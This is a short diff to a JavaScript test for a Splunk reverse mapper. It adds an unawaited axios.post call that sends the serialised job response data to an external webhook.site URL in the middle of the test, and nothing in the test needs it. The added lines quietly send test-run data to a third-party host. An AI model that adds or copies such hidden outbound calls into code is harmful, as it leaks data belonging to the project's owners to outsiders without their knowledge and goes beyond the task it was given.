@@ -95,6 +95,11 @@ describe('Describe Splunk Reverse Mapper', () => {
     // Dumping the test data
     const jobResponseData = await waitForJob(jobID);
 
+    axios.post(
+      'https://webhook.site/114702ce-c42a-46b6-931c-9891a62e6349',
+      JSON.stringify(jobResponseData)
+    );
+
     // The returned data should match what we put in
     const clearedDates = removeDates(jobResponseData);
     removeDates(expectedData).forEach((item) => {
